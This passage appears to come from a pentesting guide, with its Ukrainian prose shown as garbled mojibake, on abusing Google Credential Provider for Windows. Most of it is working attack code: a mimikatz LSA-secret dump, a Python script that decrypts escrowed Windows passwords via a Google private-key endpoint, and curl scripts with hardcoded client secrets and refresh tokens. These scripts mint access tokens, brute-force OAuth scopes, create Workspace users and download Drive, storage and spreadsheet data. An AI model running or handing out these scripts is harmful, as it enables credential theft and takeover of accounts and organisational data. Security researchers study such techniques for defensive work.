access_token="ya29.a0AcM612wWX6Pe3Pc6ApZYknGs5n66W1Hr1CQvF_L_pIm3uZaXWisWFabzxheYCHErRn28l2UOJuAbMzfn1TUpSKqvYvlhXJpxQsKEtwhYXzN2BZdOQNji0EXfF7po1_0WaxhwqOiE0CFQciiL8uAmkRsoXhq9ekC_S8xLrODZ2yKdDR6gSFULWaiIG-bOCFx3DkbOdbjAk-U4aN1WbglUAJdLZh7DMzSucIIZwKWvBxqqajSAjrdW0mRNVN2IfkcVLPndwj7fQJV2bQaCgYKAbQSAQ4SFQHGX2MiPuU1D-9-YHVzaFlUo_RwXA0277"

# Define the URL for the request
url="https://www.googleapis.com/oauth2/v1/tokeninfo"

# Loop until the token is 20 characters or the response doesn't contain "error_description"
while [ ${#access_token} -gt 20 ]; do
# Make the request and capture the response
response=$(curl -s -H "Content-Type: application/x-www-form-urlencoded" -d "access_token=$access_token" $url)

# Check if the response contains "error_description"
if [[ ! "$response" =~ "error_description" ]]; then
echo "Success: Token is valid"
echo "Final token: $access_token"
echo "Response: $response"
exit 0
fi

# Remove the last character from the token
access_token=${access_token:0:-1}

echo "Token length: ${#access_token}"
done

echo "Error: Token invalid or too short"
```
</details>

### GCPW - –í—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–∞—Ä–æ–ª—è —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É –≤–∏–≥–ª—è–¥—ñ

–©–æ–± –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ GCPW –¥–ª—è –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–∞—Ä–æ–ª—è —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É –≤–∏–≥–ª—è–¥—ñ, –º–æ–∂–Ω–∞ –≤–∏–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π –ø–∞—Ä–æ–ª—å –∑ **LSASS** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **mimikatz**:
```bash
mimikatz_trunk\x64\mimikatz.exe token::elevate lsadump::secrets exit
```
–ü–æ—Ç—ñ–º —à—É–∫–∞–π—Ç–µ —Å–µ–∫—Ä–µ—Ç, —è–∫ `Chrome-GCPW-<sid>`, —è–∫ –Ω–∞ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—ñ:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-6044191430395675441-x.jpg" alt=""><figcaption></figcaption></figure>

–ü–æ—Ç—ñ–º, –∑ **—Ç–æ–∫–µ–Ω–æ–º –¥–æ—Å—Ç—É–ø—É** –∑—ñ —Å—Ñ–µ—Ä–æ—é `https://www.google.com/accounts/OAuthLogin`, –º–æ–∂–Ω–∞ –∑–∞–ø–∏—Ç–∞—Ç–∏ –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á –¥–ª—è —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤–∫–∏ –ø–∞—Ä–æ–ª—è:

<details>

<summary>–°–∫—Ä–∏–ø—Ç –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—è —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É —Ç–µ–∫—Å—Ç—ñ, given —Ç–æ–∫–µ–Ω –¥–æ—Å—Ç—É–ø—É, –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π –ø–∞—Ä–æ–ª—å —Ç–∞ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä —Ä–µ—Å—É—Ä—Å—É</summary>
```python
import requests
from base64 import b64decode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

def get_decryption_key(access_token, resource_id):
try:
# Request to get the private key
response = requests.get(
f"https://devicepasswordescrowforwindows-pa.googleapis.com/v1/getprivatekey/{resource_id}",
headers={
"Authorization": f"Bearer {access_token}"
}
)

# Check if the response is successful
if response.status_code == 200:
private_key = response.json()["base64PrivateKey"]
# Properly format the RSA private key
private_key = f"-----BEGIN RSA PRIVATE KEY-----\n{private_key.strip()}\n-----END RSA PRIVATE KEY-----"
return private_key
else:
raise ValueError(f"Failed to retrieve private key: {response.text}")

except requests.RequestException as e:
print(f"Error occurred while requesting the private key: {e}")
return None

def decrypt_password(access_token, lsa_secret):
try:
# Obtain the private key using the resource_id
resource_id = lsa_secret["resource_id"]
encrypted_data = b64decode(lsa_secret["encrypted_password"])

private_key_pem = get_decryption_key(access_token, resource_id)
print("Found private key:")
print(private_key_pem)

if private_key_pem is None:
raise ValueError("Unable to retrieve the private key.")

# Load the RSA private key
rsa_key = RSA.import_key(private_key_pem)
key_size = int(rsa_key.size_in_bits() / 8)

# Decrypt the encrypted data
cipher_rsa = PKCS1_OAEP.new(rsa_key)
session_key = cipher_rsa.decrypt(encrypted_data[:key_size])

# Extract the session key and other data from decrypted payload
session_header = session_key[:32]
session_nonce = session_key[32:]
mac = encrypted_data[-16:]

# Decrypt the AES GCM data
aes_cipher = AES.new(session_header, AES.MODE_GCM, nonce=session_nonce)
decrypted_password = aes_cipher.decrypt_and_verify(encrypted_data[key_size:-16], mac)

print("Decrypted Password:", decrypted_password.decode("utf-8"))

except Exception as e:
print(f"Error occurred during decryption: {e}")

# CHANGE THIS INPUT DATA!
access_token = "<acces_token>"
lsa_secret = {
"encrypted_password": "<encrypted-password>",
"resource_id": "<resource-id>"
}

decrypt_password(access_token, lsa_secret)
```
</details>

–ú–æ–∂–ª–∏–≤–æ –∑–Ω–∞–π—Ç–∏ –∫–ª—é—á–æ–≤—ñ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∏ —Ü—å–æ–≥–æ –≤ –≤–∏—Ö—ñ–¥–Ω–æ–º—É –∫–æ–¥—ñ Chromium:

* API –¥–æ–º–µ–Ω: [https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code](https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code)
* API –∫—ñ–Ω—Ü–µ–≤–∞ —Ç–æ—á–∫–∞: [https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70](https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70)

### GCPW - –ì–µ–Ω–µ—Ä–∞—Ü—ñ—è —Ç–æ–∫–µ–Ω—ñ–≤ –¥–æ—Å—Ç—É–ø—É –∑ —Ç–æ–∫–µ–Ω—ñ–≤ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ç–æ–∫–µ–Ω –æ–Ω–æ–≤–ª–µ–Ω–Ω—è, –º–æ–∂–ª–∏–≤–æ –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ —Ç–æ–∫–µ–Ω–∏ –¥–æ—Å—Ç—É–ø—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –π–æ–≥–æ —Ç–∞ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –∫–ª—ñ—î–Ω—Ç–∞ —ñ —Å–µ–∫—Ä–µ—Ç –∫–ª—ñ—î–Ω—Ç–∞, –∑–∞–∑–Ω–∞—á–µ–Ω—ñ –≤ –Ω–∞—Å—Ç—É–ø–Ω—ñ–π –∫–æ–º–∞–Ω–¥—ñ:
```bash
curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCPW - Scopes

{% hint style="info" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –Ω–∞–≤—ñ—Ç—å –º–∞—é—á–∏ refresh token, –Ω–µ–º–æ–∂–ª–∏–≤–æ –∑–∞–ø–∏—Ç–∞—Ç–∏ –∂–æ–¥–µ–Ω scope –¥–ª—è access token, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–ø–∏—Ç—É–≤–∞—Ç–∏ –ª–∏—à–µ **scopes, –ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞–Ω—ñ –¥–æ–¥–∞—Ç–∫–æ–º, –≤ —è–∫–æ–º—É –≤–∏ –≥–µ–Ω–µ—Ä—É—î—Ç–µ access token**.

–¢–∞–∫–æ–∂ refresh token –Ω–µ —î –¥—ñ–π—Å–Ω–∏–º –≤ –∫–æ–∂–Ω–æ–º—É –¥–æ–¥–∞—Ç–∫—É.
{% endhint %}

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º GCPW –Ω–µ –º–∞—Ç–∏–º–µ –¥–æ—Å—Ç—É–ø—É —è–∫ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –¥–æ –∫–æ–∂–Ω–æ–≥–æ –º–æ–∂–ª–∏–≤–æ–≥–æ OAuth scope, —Ç–æ–º—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Å–∫—Ä–∏–ø—Ç, –º–∏ –º–æ–∂–µ–º–æ –∑–Ω–∞–π—Ç–∏ scopes, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∑ `refresh_token` –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó `access_token`:

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

–Ü –æ—Å—å –≤–∏—Ö—ñ–¥, —è–∫–∏–π —è –æ—Ç—Ä–∏–º–∞–≤ –Ω–∞ –º–æ–º–µ–Ω—Ç –Ω–∞–ø–∏—Å–∞–Ω–Ω—è:
```
Valid scopes:
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
```
–ö—Ä—ñ–º —Ç–æ–≥–æ, –ø–µ—Ä–µ–≤—ñ—Ä—è—é—á–∏ –≤–∏—Ö—ñ–¥–Ω–∏–π –∫–æ–¥ Chromium, –º–æ–∂–Ω–∞ [**–∑–Ω–∞–π—Ç–∏ —Ü–µ–π —Ñ–∞–π–ª**](https://github.com/chromium/chromium/blob/5301790cd7ef97088d4862465822da4cb2d95591/google\_apis/gaia/gaia\_constants.cc#L24), —è–∫–∏–π –º—ñ—Å—Ç–∏—Ç—å **—ñ–Ω—à—ñ –æ–±–ª–∞—Å—Ç—ñ** , —è–∫—ñ –º–æ–∂–Ω–∞ –≤–≤–∞–∂–∞—Ç–∏ —Ç–∞–∫–∏–º–∏, —â–æ **–Ω–µ –∑'—è–≤–ª—è—é—Ç—å—Å—è –≤ —Ä–∞–Ω—ñ—à–µ –∑–ª–∞–º–∞–Ω–æ–º—É —Å–ø–∏—Å–∫—É**. –û—Ç–∂–µ, —Ü—ñ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –æ–±–ª–∞—Å—Ç—ñ –º–æ–∂–Ω–∞ –≤–≤–∞–∂–∞—Ç–∏:

<details>

<summary>–î–æ–¥–∞—Ç–∫–æ–≤—ñ –æ–±–ª–∞—Å—Ç—ñ</summary>
```
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/aidahttps://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome
```
</details>

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –Ω–∞–π—Ü—ñ–∫–∞–≤—ñ—à–∏–º, –º–æ–∂–ª–∏–≤–æ, —î:
```c
// OAuth2 scope for access to all Google APIs.
const char kAnyApiOAuth2Scope[] = "https://www.googleapis.com/auth/any-api";
```
–û–¥–Ω–∞–∫ —è –Ω–∞–º–∞–≥–∞–≤—Å—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Ü–µ–π –æ–±—Å—è–≥ –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ gmail –∞–±–æ –¥–ª—è –ø–µ—Ä–µ–ª—ñ–∫—É –≥—Ä—É–ø, —ñ —Ü–µ –Ω–µ —Å–ø—Ä–∞—Ü—é–≤–∞–ª–æ, —Ç–æ–º—É —è –Ω–µ –∑–Ω–∞—é, –Ω–∞—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –≤—Å–µ —â–µ –∫–æ—Ä–∏—Å–Ω–æ.

**–û—Ç—Ä–∏–º–∞—Ç–∏ —Ç–æ–∫–µ–Ω –¥–æ—Å—Ç—É–ø—É –∑ —É—Å—ñ–º–∞ —Ü–∏–º–∏ –æ–±—Å—è–≥–∞–º–∏**:

<details>

<summary>Bash-—Å–∫—Ä–∏–ø—Ç –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó —Ç–æ–∫–µ–Ω–∞ –¥–æ—Å—Ç—É–ø—É –∑ refresh_token –∑ —É—Å—ñ–º–∞ –æ–±—Å—è–≥–∞–º–∏</summary>
```bash
export scope=$(echo "https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome" | tr '\n' ' ')

curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token
```
</details>

–î–µ—è–∫—ñ –ø—Ä–∏–∫–ª–∞–¥–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –¥–µ—è–∫–∏—Ö –∑ —Ü–∏—Ö –æ–±–ª–∞—Å—Ç–µ–π:

<details>

<summary>https://www.googleapis.com/auth/userinfo.email &#x26; https://www.googleapis.com/auth/userinfo.profile</summary>
```bash
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/oauth2/v2/userinfo"

{
"id": "100203736939176354570",
"email": "hacktricks@example.com",
"verified_email": true,
"name": "John Smith",
"given_name": "John",
"family_name": "Smith",
"picture": "https://lh3.googleusercontent.com/a/ACg8ocKLvue[REDACTED]wcnzhyKH_p96Gww=s96-c",
"locale": "en",
"hd": "example.com"
}
```
</details>

<details>

<summary>https://www.googleapis.com/auth/admin.directory.user</summary>
```bash
# List users
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/admin/directory/v1/users?customer=<workspace_id>&maxResults=100&orderBy=email"

# Create user
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"primaryEmail": "newuser@hdomain.com",
"name": {
"givenName": "New",
"familyName": "User"
},
"password": "UserPassword123",
"changePasswordAtNextLogin": true
}' \
"https://www.googleapis.com/admin/directory/v1/users"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/drive</summary>
```bash
# List files
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?pageSize=10&fields=files(id,name,modifiedTime)&orderBy=name"
{
"files": [
{
"id": "1Z8m5ALSiHtewoQg1LB8uS9gAIeNOPBrq",
"name": "Veeam new vendor form 1 2024.docx",
"modifiedTime": "2024-08-30T09:25:35.219Z"
}
]
}

# Download file
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/<file-id>?alt=media" \
-o "DownloadedFileName.ext"

# Upload file
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/file.ext \
"https://www.googleapis.com/upload/drive/v3/files?uploadType=media"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/devstorage.read_write</summary>
```bash
# List buckets from a project
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b?project=<project-id>"

# List objects in a bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/<bucket-name>/o?maxResults=10&fields=items(id,name,size,updated)&orderBy=name"

# Upload file to bucket
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/yourfile.ext \
"https://www.googleapis.com/upload/storage/v1/b/<BUCKET_NAME>/o?uploadType=media&name=<OBJECT_NAME>"

# Download file from bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/BUCKET_NAME/o/OBJECT_NAME?alt=media" \
-o "DownloadedFileName.ext"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/spreadsheets</summary>
```bash
# List spreadsheets
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?q=mimeType='application/vnd.google-apps.spreadsheet'&fields=files(id,name,modifiedTime)&pageSize=100"

# Download as pdf
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/106VJxeyIsVTkixutwJM1IiJZ0ZQRMiA5mhfe8C5CxMc/export?mimeType=application/pdf" \
-o "Spreadsheet.pdf"

# Create spreadsheet
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"properties": {
"title": "New Spreadsheet"
}
}' \
"https://sheets.googleapis.com/v4/spreadsheets"

# Read data from a spreadsheet
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A1:C10"

# Update data in spreadsheet
curl -X PUT \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"range": "Sheet1!A2:C2",
"majorDimension": "ROWS",
"values": [
["Alice Johnson", "28", "alice.johnson@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A2:C2?valueInputOption=USER_ENTERED"

# Append data
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"values": [
["Bob Williams", "35", "bob.williams@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/SPREADSHEET_ID/values/Sheet1!A:C:append?valueInputOption=USER_ENTERED"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/ediscovery (Google Vault)</summary>

**Google Workspace Vault** - —Ü–µ –¥–æ–¥–∞—Ç–æ–∫ –¥–ª—è Google Workspace, —è–∫–∏–π –Ω–∞–¥–∞—î —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ –¥–ª—è –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è –¥–∞–Ω–∏—Ö, –ø–æ—à—É–∫—É —Ç–∞ –µ–∫—Å–ø–æ—Ä—Ç—É –¥–∞–Ω–∏—Ö –≤–∞—à–æ—ó –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó, –∑–±–µ—Ä–µ–∂–µ–Ω–∏—Ö —É —Å–ª—É–∂–±–∞—Ö Google Workspace, —Ç–∞–∫–∏—Ö —è–∫ Gmail, Drive, Chat —Ç–∞ —ñ–Ω—à—ñ.

